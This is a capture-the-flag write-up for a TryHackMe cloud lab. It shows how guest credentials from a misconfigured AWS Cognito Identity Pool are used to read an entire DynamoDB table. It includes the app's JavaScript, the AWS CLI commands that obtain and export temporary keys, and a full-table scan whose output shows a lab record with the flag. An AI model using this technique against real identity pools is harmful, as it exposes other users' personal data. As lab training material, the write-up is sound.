# [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604)

- Hackers Holiday 2026 Dat 3. This is a cloud-based lab.

![screenshot](../data/com1.png)

![screenshot](../data/com2.png)

- From the description above, we have to deal with a misconfiguration in AWS to get access to the resources. Let's see.

- We have been given an Amazon S3 Static Website endpoint. 

![screenshot](../data/com3.png)

- Visit the URL in a browser; in the dev tools network tab, I found an app.js file. 
- Let's visit the /app.js endpoint

```
// Byte Lotus Wellness â€” guest dashboard
//
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.

const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});

function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    // First visit: hand out a throwaway guest id, same as checking in.
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}

function renderDashboard(item) {
  const el = document.getElementById("dashboard");
  if (!item) {
    el.textContent = "Welcome! We don't have wellness data for you yet â€” check back after your first spa visit.";
    return;
  }
  el.textContent = [
    "Name: " + (item.name ? item.name.S : "â€”"),
    "Loyalty notes: " + (item.notes ? item.notes.S : "â€”"),
  ].join("\n");
}

AWS.config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }

  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    {
      TableName: TABLE_NAME,
      Key: { guest_id: { S: guestId() } },
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      renderDashboard(data.Item);
    }
  );
});
```

- The code contains the AWS config block responsible for handling the access control.

```
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

- This configuration uses Amazon Cognito Identity Pools to obtain temporary AWS credentials for users of the application.

-  A common use case is allowing visitors to access specific AWS resources (such as DynamoDB or S3) without requiring them to create an account.

- **IDENTITY_POOL_ID**: The Cognito Identity Pool ID configured to grant temporary AWS access to unauthenticated guest visitors

- **AWS_REGION**: The AWS region 

- **TABLE_NAME**: The target DynamoDB table storing guest profiles (complimentary-GuestWellnessProfiles).

- We need an Identity ID to get the temporary credentials; for that, we need an IDENTITY_POOL_ID which we already have.

```
aws cognito-identity get-id --region us-east-1 --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" 
```
- The above command gives an IdentityId
```
{
    "IdentityId": "us-east-1:4d571309-b0bc-c195-81cc-181beedd41aa"
}
```
- Now we can exchange this identityId for temporary credentials.

```
 aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id "us-east-1:4d571309-b0bc-c195-81cc-181beedd41aa" 
```

![screenshot](../data/com4.png)

```
    "IdentityId": "us-east-1:4d571309-b0bc-c195-81cc-181beedd41aa",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYC5MSQ5JY",
        "SecretKey": "1M/w7j8wCM/xLKXsFLzezi73SUvUk0uE50w4GDjn",
        "SessionToken": "IQoJb3JpZ2luX2VjEEAaCXVzLWVhc3QtMSJHMEUCIQDEUOD/W0feZWb3Whrm+7bvWy9hZ/RC5/S304ANGH7DZgIgJNCI71ooAR9zJq+IyOejjpJrkIzw08Sx/ndxD81bAiMqrQUICBAAGgwzMzIxNzMzNDcyNDgiDFxvLh3YU/0QxjM1hyqKBdB2Qlbn1rvBPbipIBNseIUoXoDLJa0o3zYkIIKt0+pJeSygRDdOM4/18OFgej6VyQWDB+NxvpQPQQ6bEOOKiasaDZ0G0uqUZKWgkbCqxWxzPePeKo7s+zeWuQHC2PdB1Q80SJtu0pGeymlJetJ/BF7xioPpm+emvM5Od1iKL8L8YPTG38AiJBB6FIX69HdVTFIJuM2RaEHY8Po979PhP1Zhqg5STfPD0TiH6KwQqbk19w52xS7xKDRvC6qe1+DmmacO4JZ1ywxtuNQ2144yrUemCuaVDibF97QuC4zj+BGv614Ln4z3tCJmeeHMLV5HMTtKNmt2zk0w80ubKA0BU9SJ5DJlIJgnaRVsky0JUADOk23am2BlhcBEwUJmxh37kvxfX14r4UIa6I2LQtKNHFf0ITVML5VWWU2wjBiwXVCrFu/5R10QSgxwg+P1MzKDtWsQf202LToT8Ed/wyNSlFGrYOJyD/aleefvTKmMVmZr9V6IKnrBfeelzfC0lK0N2TObozNAxTrx/vgZW6K4hZQkL40m31OyTIOwXC5gDOALmgQGIGHVTrUGTP3FcI708Rp5Uor1nRIFpxJ8sXqYAQVlur24Vdec8gVPFlLhhk9aUWEvVguoxmCWxzWBcUsPBZPtWKp4dzpERIY8b7/M9YwF4XHbEP8/0TlyT8H7regpgfcPmbIewJyy80Rgq3W3sNbglcuca8BI7oHGQw/A08aDU2RaIUFgYVWNYMJ9s2TgRdrTWiyaarDwnCCSYSPQ0BCVX5kaa1haJkMjEDQVq7YlZfIiK2eeqKB2cCcwn87RYcmKUGF7nHcEvxW6aIBKj/j34wVYFqDXvFWInNgeqsJd7MgfhFvzmUXwMKSfxtMGOt8Cv651FeN4KrO9vHaLfwDp7KvbwZNo+7TAvaSV4cNHdNYT9ZsPSOppCuO9C3la8/9/v+9VsJXwIf5KPmLerd1XrLTwCH2NJ64IKHoxOOJ9ypLk5fZw7EArcVBbT/Rtsf5aous4MSICJ01VC2rLPYmniIY5VoWhXM5e3CdpdguCgVhCc2Syr3iOeYiKrg6PGuMgDFsFtFpSz+NQklXDlHsx2G/QQQRm1qZBEg1+Oi4/HO/Eyq5zRtC+GWaNsio+99IajDkBXjJwpLn3hcV23DmmjVf/dcwLxHR4tt6CXwrDKZhm3QtFQMN8HcVGl0lwyNGNN5zXIlt0mKzh1bQikmHEmy7/kYQr1klVzBLUVOxMluj3R2e4GQvevKIEbdUnshKWv7Lb7DjqvzzPLXraC99ssQE3fhBq4g6SuA7C+lXdj1/nQV8OgAQRY8bzmOzXd16/zrxb4jWwWc8kZz8ayW7H",
        "Expiration": "2026-08-04T13:37:16+05:30"
    }
}
```
- Load the credentials into our terminal that gives access to the DynamoDB table.

![screenshot](../data/com5.png)

```
~/TryHackMe/Hackers_holiday ❯ export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYC5MSQ5JY"

~/TryHackMe/Hackers_holiday ❯ export AWS_SECRET_ACCESS_KEY="1M/w7j8wCM/xLKXsFLzezi73SUvUk0uE50w4GDjn"

~/TryHackMe/Hackers_holiday ❯ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEEAaCXVzLWVhc3QtMSJHMEUCIQDEUOD/W0feZWb3Whrm+7bvWy9hZ/RC5/S304ANGH7DZgIgJNCI71ooAR9zJq+IyOejjpJrkIzw08Sx/ndxD81bAiMqrQUICBAAGgwzMzIxNzMzNDcyNDgiDFxvLh3YU/0QxjM1hyqKBdB2Qlbn1rvBPbipIBNseIUoXoDLJa0o3zYkIIKt0+pJeSygRDdOM4/18OFgej6VyQWDB+NxvpQPQQ6bEOOKiasaDZ0G0uqUZKWgkbCqxWxzPePeKo7s+zeWuQHC2PdB1Q80SJtu0pGeymlJetJ/BF7xioPpm+emvM5Od1iKL8L8YPTG38AiJBB6FIX69HdVTFIJuM2RaEHY8Po979PhP1Zhqg5STfPD0TiH6KwQqbk19w52xS7xKDRvC6qe1+DmmacO4JZ1ywxtuNQ2144yrUemCuaVDibF97QuC4zj+BGv614Ln4z3tCJmeeHMLV5HMTtKNmt2zk0w80ubKA0BU9SJ5DJlIJgnaRVsky0JUADOk23am2BlhcBEwUJmxh37kvxfX14r4UIa6I2LQtKNHFf0ITVML5VWWU2wjBiwXVCrFu/5R10QSgxwg+P1MzKDtWsQf202LToT8Ed/wyNSlFGrYOJyD/aleefvTKmMVmZr9V6IKnrBfeelzfC0lK0N2TObozNAxTrx/vgZW6K4hZQkL40m31OyTIOwXC5gDOALmgQGIGHVTrUGTP3FcI708Rp5Uor1nRIFpxJ8sXqYAQVlur24Vdec8gVPFlLhhk9aUWEvVguoxmCWxzWBcUsPBZPtWKp4dzpERIY8b7/M9YwF4XHbEP8/0TlyT8H7regpgfcPmbIewJyy80Rgq3W3sNbglcuca8BI7oHGQw/A08aDU2RaIUFgYVWNYMJ9s2TgRdrTWiyaarDwnCCSYSPQ0BCVX5kaa1haJkMjEDQVq7YlZfIiK2eeqKB2cCcwn87RYcmKUGF7nHcEvxW6aIBKj/j34wVYFqDXvFWInNgeqsJd7MgfhFvzmUXwMKSfxtMGOt8Cv651FeN4KrO9vHaLfwDp7KvbwZNo+7TAvaSV4cNHdNYT9ZsPSOppCuO9C3la8/9/v+9VsJXwIf5KPmLerd1XrLTwCH2NJ64IKHoxOOJ9ypLk5fZw7EArcVBbT/Rtsf5aous4MSICJ01VC2rLPYmniIY5VoWhXM5e3CdpdguCgVhCc2Syr3iOeYiKrg6PGuMgDFsFtFpSz+NQklXDlHsx2G/QQQRm1qZBEg1+Oi4/HO/Eyq5zRtC+GWaNsio+99IajDkBXjJwpLn3hcV23DmmjVf/dcwLxHR4tt6CXwrDKZhm3QtFQMN8HcVGl0lwyNGNN5zXIlt0mKzh1bQikmHEmy7/kYQr1klVzBLUVOxMluj3R2e4GQvevKIEbdUnshKWv7Lb7DjqvzzPLXraC99ssQE3fhBq4g6SuA7C+lXdj1/nQV8OgAQRY8bzmOzXd16/zrxb4jWwWc8kZz8ayW7H"

~/TryHackMe/Hackers_holiday ❯ export AWS_DEFAULT_REGION="us-east-1"
```

- To verify the credentials I am going to use 

```aws sts get-caller-identity``` 

- which returns identity details for the active AWS credentials set in the environment.

```
{
    "UserId": "AROAU2VYTBGYCEB4JME2S: CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```
- From the output, we can see we have "complimentary-cognito-unauth-role"
- Now, with this access, we can directly query the database.

```
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

- **aws dynamodb scan**: Scans and retrieves all records from the target table

```
     {
            "password": {
                "S": "escalation_only"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
            },
            "guest_id": {
                "S": "guest-vip-042"
            },
            "email": {
                "S": "vip042@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0100"
            },
            "name": {
                "S": "Guest VIP-042"
            }
        },
```
- In the above record, we can see the flag.

**Flag: THM{fr33_app_fr33_d4t4!}**
